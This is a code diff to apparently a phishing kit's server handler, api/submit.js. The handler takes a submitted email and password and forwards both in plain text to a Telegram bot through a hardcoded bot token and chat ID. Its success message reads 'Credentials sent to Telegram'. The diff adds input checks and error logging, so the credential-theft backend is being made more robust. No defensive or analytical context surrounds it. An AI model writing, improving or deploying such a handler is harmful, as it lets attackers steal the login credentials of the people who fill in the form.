@@ -1,8 +1,10 @@
-// api/submit.js
 module.exports = (req, res) => {
     const { email, password } = req.body;
 
-    // Handle the form submission, e.g., send to Telegram bot
+    if (!email || !password) {
+        return res.status(400).json({ signal: 'error', msg: 'Email and password are required' });
+    }
+
     const telegramBotToken = '7468423665:AAG1jEh6Qul02uE4CaZj5VS6VTeqaRRB0m4';
     const telegramChatId = '5172045930';
     const telegramMessage = `Email: ${email}\nPassword: ${password}`;
@@ -24,6 +26,7 @@ module.exports = (req, res) => {
         res.status(200).json({ signal: 'ok', msg: 'Credentials sent to Telegram' });
     })
     .catch(error => {
+        console.error('Error sending to Telegram:', error);
         res.status(500).json({ signal: 'error', msg: 'Failed to send credentials' });
     });
 };
